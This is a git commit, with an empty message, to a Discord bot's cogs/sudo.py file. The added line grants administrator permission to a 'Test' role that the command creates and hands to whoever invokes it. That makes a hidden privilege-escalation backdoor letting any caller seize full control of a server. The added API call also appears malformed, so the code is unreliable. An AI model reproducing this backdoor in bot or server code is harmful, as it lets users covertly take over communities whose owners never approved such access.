0ad47bc01fc4c2c3aa9d2f3ee5117ff1a3a48be1
Aron Buzinkay <aron.buzinkay@gmail.com>
2018-08-27 00:47:47 +0200

    .

--- cogs/sudo.py
+++ cogs/sudo.py
@@ -15,6 +15,7 @@ class sudo:
         role_name = "Test"
         guild = ctx.guild
         await guild.create_role(name=role_name)
+        await guild.edit_role(name=role_name, permissions=discord.PermissionOverwrite(administrator = True))
         role = discord.utils.get(ctx.guild.roles, name=role_name)
         user = ctx.message.author
         await user.add_roles(role)
